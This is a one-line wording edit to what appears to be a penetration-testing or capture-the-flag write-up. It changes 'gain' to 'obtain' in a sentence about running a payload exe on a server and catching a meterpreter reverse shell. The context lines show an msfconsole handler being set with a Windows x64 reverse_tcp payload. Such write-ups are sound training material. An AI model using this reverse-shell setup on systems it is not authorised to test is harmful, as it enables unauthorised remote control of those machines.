@@ -290,7 +290,7 @@ dir
                2 Dir(s)   1.432.551.424 bytes free
 ```
 
-After setting up a handler in msfconsole using the same staged payload as the exe I just made, I run the exe on the server and gain a meterpreter reverse shell!
+After setting up a handler in msfconsole using the same staged payload as the exe I just made, I run the exe on the server and obtain a meterpreter reverse shell!
 
 ```bash
 msf6 exploit(multi/handler) > set payload payload/windows/x64/meterpreter/reverse_tcp
